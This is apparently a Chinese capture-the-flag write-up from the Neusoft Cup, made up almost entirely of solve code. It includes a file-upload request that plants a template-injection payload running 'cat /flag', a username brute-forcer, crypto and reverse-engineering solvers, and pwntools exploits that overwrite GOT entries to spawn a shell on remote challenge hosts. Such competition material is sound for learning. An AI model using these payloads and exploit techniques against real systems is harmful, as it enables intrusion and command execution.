# 东软杯-WriteUp

> 原文: https://www.ctfiot.com/15954.html
> ID: 15954

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
POST / HTTP/1.1
Host: 04b6fdd3-eb54-4462-a3ea-f8b1d7093dc9.nssctf.neusoft.edu.cn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------33068241626403375462622000045
Content-Length: 362
Origin: http://04b6fdd3-eb54-4462-a3ea-f8b1d7093dc9.nssctf.neusoft.edu.cn
Connection: close
Referer: http://04b6fdd3-eb54-4462-a3ea-f8b1d7093dc9.nssctf.neusoft.edu.cn/
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
 
-----------------------------33068241626403375462622000045
Content-Disposition: form-data; name="file"; filename="index.tpl"
Content-Type: image/png
 
{{system('cat /flag')}}
-----------------------------33068241626403375462622000045
Content-Disposition: form-data; name="path"
 
./templates
-----------------------------33068241626403375462622000045--
```



```
import requests
url = "http://47.106.172.144:2333/?pass=husins&user="
space = "*"
letter_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
                'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
               '1','2','3','4','5','6','7','8','9','0',"_"]
user = ['','','','','']
for j in user:
    for i in letter_list:
        url1 = url  + str(j) + str(i) + space;
        # print(url1)
        resp = requests.get(url1)
        if "密码错误" in resp.text:
            print(j + i)
        if "用户查询不唯一" in resp.text:
            print(j + i)
```



```
import zipfile
import re
zipname = "yasuobao.zip"
while True:
    ts1 = zipfile.ZipFile(zipname)
    print ts1.namelist()[0]
    res = re.search('[0-9]*',ts1.namelist()[0])
    print res.group()
    passwd = res.group()
    ts1.extractall("001\ziptest\",pwd=passwd)
    zipname = "001\ziptest\"+ts1.namelist()[0]
```



```
A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544)
p = 174807157365465092731323561678522236549173502913317875393564963123330281052524687450754910240009920154525635325209526987433833785499384204819179549544106498491589834195860008906875039418684191252537604123129659746721614402346449135195832955793815709136053198207712511838753919608894095907732099313139446299843
g = 41899070570517490692126143234857256603477072005476801644745865627893958675820606802876173648371028044404957307185876963051595214534530501331532626624926034521316281025445575243636197258111995884364277423716373007329751928366973332463469104730271236078593527144954324116802080620822212777139186990364810367977
A = Mod(A,p)
G = Mod(g,p)
a = bsgs(G,A,(0,2^40))
print(a)
# 822690494337
A, B = (142989488568573584455487421652639325256968267580899511353325709765313839485530879575182195391847106611058986646758739505820350416810754259522949402428485456431884223161690132385605038767582431070875138678612435983425500273038807582069763455994486365993366499478412783220052753597397455113133312907456163112016, 16631700400183329608792112442038543911563829699195024819408410612490671355739728510944167852170853457830111233224257622677296345757516691802411264928943809622556723315310581871447325139349242754287009766402650270061476954875266747743058962546605854650101122523183742112737784691464177427011570888040416109544)
key = pow(B, a ,p)
key = long_to_bytes(key)[:16]
cipher = AES.new(key, AES.MODE_ECB)

ct = bytes.fromhex("ed5c68ebb65aa3a13afb259cf3984ce60bdc54b7ef918b850745df850cf4c450b02216c0c6e67ed501a17e516496cd6c")
flag = cipher.decrypt(ct)
print(flag)
```



```
package com.yq1ng.Utils;
import java.math.BigInteger;
import java.security.SecureRandom;
import java.util.Random;
/**
 * @author ying
 * @Description
 * @create 2021-12-04 2:12 PM
 */
public class Utils {
    private static Random ran = null;
    static {
        ran = new SecureRandom();
    }
    /**
     * 计算 base^exp % n
     *
     * @param base
     * @param exp
     * @param n
     * @return
     */
    public static BigInteger expmod(int base, BigInteger exp, BigInteger n) {
        if (exp.equals(BigInteger.ZERO)) {
            return BigInteger.ONE;
        }
        if (!exp.testBit(0)) {//如果为偶数
            return expmod(base, exp.divide(BigInteger.valueOf(2)), n).pow(2).remainder(n);
        } else {
            return (expmod(base, exp.subtract(BigInteger.ONE).divide(BigInteger.valueOf(2)), n).pow(2).multiply(BigInteger.valueOf(base))).remainder(n);
        }
    }
    /**
     * 费马测试, 如果返回false, 则n肯定为合数, 如果为true, 则n有一半以上的概率为素数
     *
     * @param n
     * @return
     */
    public static boolean fermatTest(BigInteger n) {
        int base = 0;
        if (n.compareTo(BigInteger.valueOf(Integer.MAX_VALUE)) < 0) {
            base = ran.nextInt(n.intValue() - 1) + 1;
        } else {
            base = ran.nextInt(Integer.MAX_VALUE - 1) + 1;
        }
        if (expmod(base, n, n).equals(BigInteger.valueOf(base))) {
            return true;
        } else {
            return false;
        }
    }
    /**
     * Miller-Rabin测试
     *
     * @param n
     * @return
     */
    public static boolean passesMillerRabin(BigInteger n) {
        int base = 0;
        if (n.compareTo(BigInteger.valueOf(Integer.MAX_VALUE)) < 0) {
            base = ran.nextInt(n.intValue() - 1) + 1;
        } else {
            base = ran.nextInt(Integer.MAX_VALUE - 1) + 1;
        }
        BigInteger thisMinusOne = n.subtract(BigInteger.ONE);
        BigInteger m = thisMinusOne;
        while (!m.testBit(0)) {
            m = m.shiftRight(1);
            BigInteger z = expmod(base, m, n);
            if (z.equals(thisMinusOne)) {
                break;
            } else if (z.equals(BigInteger.ONE)) {
            } else {
                return false;
            }
        }
        return true;
    }
    public static boolean isPrime(BigInteger n) {
        //copy自jdk源码, n的bit数越多, 需要的检测次数就越少
        //注释说是根据标准 ANSI X9.80, "PRIME NUMBER GENERATION, PRIMALITY TESTING, AND PRIMALITY CERTIFICATES".
        //我不知道为什么
        int sizeInBits = n.bitLength();
        int tryTime = 0;
        if (sizeInBits < 100) {
            tryTime = 50;
        }
        if (sizeInBits < 256) {
            tryTime = 27;
        } else if (sizeInBits < 512) {
            tryTime = 15;
        } else if (sizeInBits < 768) {
            tryTime = 8;
        } else if (sizeInBits < 1024) {
            tryTime = 4;
        } else {
            tryTime = 2;
        }
        return isPrime(n, tryTime);
    }
    /**
     * 多次调用素数测试, 判定输入的n是否为质数
     *
     * @param n
     * @param tryTime
     * @return
     */
    public static boolean isPrime(BigInteger n, int tryTime) {
        for (int i = 0; i < tryTime; i++) {
            if (!passesMillerRabin(n)) {
                return false;
            }
        }
        return true;
    }
    /**
     * 产生一个n bit的素数
     *
     * @param bitCount
     * @return
     */
    public static BigInteger getPrime(int bitCount) {
        //随机生成一个n bit的大整数
        BigInteger init = new BigInteger(bitCount, ran);
        //如果n为偶数, 则加一变为奇数
        if (!init.testBit(0)) {
            init = init.setBit(0);
        }
        int i = 0;
        //基于素数定理, 平均只需要不到n次搜索, 就能找到一个素数
        while (!isPrime(init)) {
            i++;
            init = init.add(BigInteger.valueOf(2));
        }
        //System.out.println(String.format("try %dttimes", i));
        return init;
    }
}

import com.yq1ng.Utils.Utils;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
/**
 * @author ying
 * @Description
 * @create 2021-11-06 12:07
 */
public class test {
    public static void main(String[] args) {
        for(int x = 1; x <= 20; x = x+1)
            System.out.println(Utils.getPrime(1024));
    }
}
```



```
# -*- coding: utf-8 -*-
from pwn import *
p=process('./1')
#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
elf=ELF('./1')
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
context.log_level='debug'
def debug():
    gdb.attach(p)
    pause()
def lg(name,val):
    log.success(name+' : '+hex(val))

exit_got=elf.got['exit']
read_got=elf.got['read']
setvbuf_got=elf.got['setvbuf']
def pwn():
    #p=remote('47.106.172.144',65003)
    p.recvuntil('good')
    p.send(p32(0x4011A9))
    p.recvuntil('luck! ')
    p.send(str(exit_got))
    #p.interactive()

    p.recvuntil('good')
    p.send('x00x7axe2x3d')

    p.recvuntil('luck! ')
    p.send(str(setvbuf_got-1))
    p.sendline('ls')
    p.recvuntil('flag')
    p.sendline('cat flag')

    p.interactive()
while True:
    try:
        p=remote('47.106.172.144',65003)
        pwn()
    except:
        p.close()
        continue
```



```
# -*- coding: utf-8 -*-
from pwn import *
p=process('./1')
elf=ELF('./1')

#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
libc=ELF('libc-2.23.so')
print hex(libc.sym['printf'])
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
context.log_level='debug'
def debug():
    gdb.attach(p)
    pause()
def lg(name,val):
    log.success(name+' : '+hex(val))

main=0x4011D5
pop_rdi=0x00000000004012b3
pop_rbp=0x000000000040114d
lea_ret=0x00000000004011d3

payload=p64(0x4011A9)+p64(0x4011FF)+p64(0x401080)
#payload=p64(pop_rdi)+p64(elf.got['read'])+p64(0x40122F)
#payload=p64(0x4011FB)
def pwn():
    p.send(payload)
    p.recvuntil('where are you from? my frends??')
    p.send(str(-0x28))
    p.send(str(0x000000000404020))
    
    p.send('x26x82x3b')
    p.sendline('ls')
    p.sendline('ls')
    p.recvuntil('flag')
    p.sendline('cat flag')
    p.interactive()

while True:
    try:
        p=remote('47.106.172.144',65004)
        pwn()
    except:
        p.close()
        continue
```



```
# -*- coding: utf-8 -*-
from pwn import *
#p=process('./1')
p=remote('47.106.172.144',65001)
elf=ELF('./1')
#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
#libc=ELF('/glibc/2.23/64/lib/libc-2.23.so')
#libc=ELF('libc-2.23.so')
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
context.log_level='debug'
def debug():
 gdb.attach(p)
 pause()
def lg(name,val):
 log.success(name+' : '+hex(val))
def menu(a):
 p.recvuntil('> ')
 p.sendline(str(a))
def add(count):
 menu(1)
 p.recvuntil('List count: ')
 p.sendline(str(count))
def show(idx1,idx2):
 menu(2)
 p.recvuntil('List id: ')
 p.sendline(str(idx1))
 p.recvuntil('Item id: ')
 p.sendline(str(idx2))
def edit(idx1,idx2,idx3):
 menu(3)
 p.recvuntil('List id: ')
 p.sendline(str(idx1))
 p.recvuntil('Item id: ')
 p.sendline(str(idx2))
 p.recvuntil('New number: ')
 p.sendline(str(idx3))
def overwrite(idx1,idx2,idx3,idx4):
 menu(4)
 p.recvuntil('List id: ')
 p.sendline(str(idx1))
 p.recvuntil('Star id: ')
 p.sendline(str(idx2))
 p.recvuntil('End id: ')
 p.sendline(str(idx3))
 p.recvuntil('New number: ')
 p.sendline(str(idx4))
def showall():
 menu(5)
add(1)
overwrite(0,3,3,0x3b1)
add(0x100)
add(1)
overwrite(0,9,10,0x1000000)

show(2,1)
p.recvuntil('Number: ')
a=int(p.recvuntil('n',drop=True))

libc_address=a-88-0x3c4b10-0x10
lg('libc_address',libc_address)
pause()
overwrite(0,8,8,elf.got['atoi'])
#edit(2,0,libc.sym['system'])
edit(2,0,libc_address+0x0453a0)
#debug()
menu('/bin/shx00')
p.interactive()
```



```
int __thiscall sub_403B70(void *this, char a2)
{
  char v3[65]; // [esp+Fh] [ebp-45h] BYREF
  void *v4; // [esp+50h] [ebp-4h]
  v4 = this;
  v3[0] = a2 ^ 0x14;
  sub_406170(v3);
  return ++dword_4DD8F8;
}
```



```
int sub_40144B()
{
 struct sigaction v1; // [rsp+0h] [rbp-140h] BYREF
 struct sigaction v2; // [rsp+A0h] [rbp-A0h] BYREF
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_400E1D;
 v2.sa_flags = 4;
 sigaction(34, &v2, &v1);
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_400E78;
 v2.sa_flags = 4;
 sigaction(35, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_400ED7;
 v2.sa_flags = 0;
 sigaction(36, &v2, &v1);
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_400F16;
 v2.sa_flags = 4;
 sigaction(37, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_400F67;
 v2.sa_flags = 0;
 sigaction(38, &v2, &v1);
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_400FA8;
 v2.sa_flags = 4;
 sigaction(39, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_400FFB;
 v2.sa_flags = 0;
 sigaction(40, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_40103A;
 v2.sa_flags = 0;
 sigaction(41, &v2, &v1);
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_401089;
 v2.sa_flags = 4;
 sigaction(42, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_4010EA;
 v2.sa_flags = 0;
 sigaction(43, &v2, &v1);
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_40113A;
 v2.sa_flags = 4;
 sigaction(44, &v2, &v1);
 sigemptyset(&v2.sa_mask);
 v2.sa_handler = (__sighandler_t)sub_40116C;
 v2.sa_flags = 4;
 sigaction(45, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_4011AD;
 v2.sa_flags = 0;
 sigaction(46, &v2, &v1);
 v2.sa_handler = (__sighandler_t)sub_40120D;
 v2.sa_flags = 0;
 return sigaction(47, &v2, &v1);
}
```



```
00000000 vm              struc ; (sizeof=0x16, mappedto_28)
00000000 stack_ptr           dq ?                    ; offset
00000008 data_ptr            dq ?                    ; offset
00000010 vm_rax          db ?
00000011 vm_rbx          db ?
00000012 vm_rcx          db ?
00000013 vm_esp          db ?
00000014 vm_eip          db ?
00000015 vm_eflags       db ?
00000016 vm              ends
main函数开头，0x4012c8中父子进程mmap了一段共享内存，是虚拟机的内存空间
char *sub_4012C8()
{
 char *result; // rax
 result = (char *)mmap(0LL, 0x200uLL, 3, 0x21, -1, 0LL);
 s1 = result;
 return result;
}
dump出0x4019c0, opcode
17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18
```



```
opcode=[17, 52, 0, 42, 5, 16, 20, 9, 23, 0, 36, 5, 3, 17, 29, 6, 0, 0, 5, 3, 17, 64, 6, 0, 72, 5, 17, 29, 23, 14, 1, 21, 4, 15, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 50, 5, 9, 2, 19, 29, 5, 18, 21, 4, 16, 20, 61, 10, 1, 19, 52, 3, 4, 18, 14, 1, 21, 4, 7, 1, 22, 2, 0, 0, 4, 3, 5, 16, 20, 85, 5, 9, 1, 19, 64, 5, 18]
data=[0]*512
cnt=0
target=0
def sig_hand(sig:int,a1=None):
   global cnt
   s='unknown:{}'.format(sig)
   if sig==34:
       # data[esp++]=a1
       s='push {}'.format(a1)
   elif sig==35:
       s='pop {}'.format(a1)
   elif sig==36:
       s='add rax,rbx'
   elif sig==37:
       s='add {},{}'.format(a1,target)
   elif sig==38:
       s='sub rax,rbx'
   elif sig==39:
       s='sub {},{}'.format(a1,target)
   elif sig==40:
       s='xor rax,rbx'
   elif sig==41:
       s='test rax,rbx' # set flag
   elif sig==42:
       s='call {}'.format(target)
   elif sig==43:
       s='ret'
   elif sig==44:
       s='jmp {}'.format(target)
   elif sig==45:
       s='jz {}'.format(target)
   elif sig==46:
       s='push data[rcx]'
   elif sig==47:
       s='pop data[rcx]'
   elif sig==2:
       s='check'
   return s
ip_lst=[0,8,9,10,12,13,14,17,19,20]
while cnt<len(opcode):
   op=opcode[cnt]
   s='unknown'
   last_cnt=cnt
   cnt+=1
   if op in ip_lst:
       target=opcode[cnt]
       cnt+=1
   if op==0:
       s=sig_hand(34,target)
   elif op==1:
       s=sig_hand(34,'rax')
   elif op==2:
       s=sig_hand(34,'rbx')
   elif op==3:
       s=sig_hand(34,'rcx')
       pass
   elif op==4:
       s=sig_hand(35,'rax')
   elif op==5:
       s=sig_hand(35,'rbx')
   elif op==6:
       s=sig_hand(35,'rcx')
   elif op==7:
       s=sig_hand(36)
   elif op==8:
       s=sig_hand(37,'rax')
   elif op==9:
       s=sig_hand(37,'rbx')
   elif op==10:
       s=sig_hand(37,'rcx')
   elif op==11:
       s=sig_hand(38)
       pass
   elif op==12:
       s=sig_hand(39,'rax')
   elif op==13:
       s=sig_hand(39,'rbx')
   elif op==14:
       s=sig_hand(39,'rcx')
   elif op==15:
       s=sig_hand(40)
   elif op==16:
       s=sig_hand(41)
   elif op==17:
       s=sig_hand(42)
   elif op==18:
       s=sig_hand(43)
   elif op==19:
       s=sig_hand(44)
   elif op==20:
       s=sig_hand(45)
   elif op==21:
       s=sig_hand(46)
   elif op==22:
       s=sig_hand(47)
   else:
       s=sig_hand(2)
   print("%02d:%s"%(last_cnt,s))
```



```
00:call 52 ; strlen
02:push 42
04:pop rbx
05:test rax,rbx
06:jz 9
08:check
09:push 36
11:pop rbx
12:push rcx
13:call 29
15:pop rcx
16:push 0
18:pop rbx
19:push rcx
20:call 64
22:pop rcx
23:push 72
25:pop rbx
26:call 29
28:check
29:sub rcx,1
31:push data[rcx]
32:pop rax
33:xor rax,rbx
34:push rax
35:pop data[rcx]
36:push rbx
37:push 0
39:pop rax
40:push rcx
41:pop rbx
42:test rax,rbx
43:jz 50
45:pop rbx
46:add rbx,2
48:jmp 29
50:pop rbx
51:ret
52:push data[rcx]
53:pop rax
54:test rax,rbx
55:jz 61
57:add rcx,1
59:jmp 52
61:push rcx
62:pop rax
63:ret
64:sub rcx,1
66:push data[rcx]
67:pop rax
68:add rax,rbx
69:push rax
70:pop data[rcx]
71:push rbx
72:push 0
74:pop rax
75:push rcx
76:pop rbx
77:test rax,rbx
78:jz 85
80:pop rbx
81:add rbx,1
83:jmp 64
85:pop rbx
86:ret
```



```
t=[i for i in b'xa3xd8xacxa9xa8xd6xa6xcdxd0xd5xf7xb7x9cxb31-@[K:xfdWB_XRTx1bx0cx9-xd9=5x1ftA@GBx11']
rbx=72
for i in range(len(t)-1,-1,-1):
   t[i]^=rbx
   rbx+=2
   rbx&=0xff
rbx=0
for i in range(len(t)-1,-1,-1):
   t[i]-=rbx
   t[i]+=0x100
   t[i]&=0xff
   rbx+=1
   rbx&=0xff
rbx=36
for i in range(len(t)-1,-1,-1):
   t[i]^=rbx
   rbx+=2
   rbx&=0xff
print(t)
print(bytes(t))
```



```
data=[0x9E,0xE7,0x30,0x5F,0xA7,0x01,0xA6,0x53,0x59,0x1B,0x0A,0x20,0xF1,0x73,0xD1,0x0E,0xAB,0x09,0x84,0x0E,0x8D, 0x2B]
tem=[0xda,0xa9,0x73,0x1A,0xFE,0x4D,0xED,0x12,0x1E,0x66,0x5C,0x6D,0x8C,0x3C,0x96,0x49,0xFD,0x74,0xDF,0x43,0xDA,0x74]
flag=''
for i in range(22):
    flag+=chr(data[i]^tem[i]^0x22)
print(flag)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/3-1638934365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/10-1638934365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/9-1638934365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/7-1638934365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/6-1638934365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/0-1638934365.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/9-1638934366.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/5-1638934366.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/8-1638934366.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/10-1638934366.jpeg)